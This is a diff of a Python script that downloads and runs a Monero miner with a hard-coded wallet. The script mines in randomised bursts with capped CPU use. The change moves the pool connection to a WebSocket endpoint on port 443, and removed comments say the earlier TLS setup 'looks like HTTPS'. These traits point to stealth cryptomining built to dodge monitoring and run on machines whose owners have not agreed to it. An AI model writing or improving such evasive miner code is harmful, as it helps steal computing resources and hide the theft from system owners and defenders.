@@ -6,14 +6,12 @@ import random
 import threading
 import urllib.request
 import zipfile
-import json
 
 # ==================== Configuration ====================
 WALLET = "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP"
-POOL = "pool.supportxmr.com:443"          # TLS, looks like HTTPS
-RUNTIME_MINUTES = 180                     # 3 hours
+POOL = "wss://gulf.moneroocean.stream:443"   # WebSocket endpoint
+RUNTIME_MINUTES = 180
 
-# Burst parameters (minutes)
 MIN_WORK = 1
 MAX_WORK = 8
 MIN_BREAK = 0.5
@@ -85,13 +83,11 @@ def main():
 
         print(f"\n[+] Burst: work {work_sec//60} min, break {break_sec//60} min, CPU hint {cpu_hint}%")
 
-        # Command-line arguments (no config file)
         cmd = [
             exe_path,
             f"--url={POOL}",
             f"--user={WALLET}",
             "--pass=x",
-            "--tls",
             "--keepalive",
             f"--cpu-max-threads-hint={cpu_hint}",
             "--cpu-priority=5",
@@ -112,22 +108,19 @@ def main():
         )
         print(f"[+] Miner started (PID {miner_proc.pid})")
 
-        # Monitor miner output during work period
+        # Monitor output
         work_start = time.time()
         while time.time() - work_start < work_sec:
-            # Read a line (non-blocking)
             line = miner_proc.stdout.readline()
             if line:
                 print(f"[Miner] {line.strip()}")
             else:
-                # No output, check if process died
                 if miner_proc.poll() is not None:
                     print(f"[!] Miner died. Exit code: {miner_proc.returncode}")
                     break
-                # If alive but no output, wait a bit
                 time.sleep(0.5)
 
-        # Kill miner if still alive
+        # Stop miner
         if miner_proc.poll() is None:
             miner_proc.terminate()
             miner_proc.wait(timeout=10)
@@ -135,7 +128,7 @@ def main():
         else:
             print("[+] Miner already stopped.")
 
-        # Break period
+        # Break
         print(f"[+] Breaking for {break_sec//60} minutes...")
         for _ in range(break_sec):
             if time.time() >= total_end or stop_event.is_set():
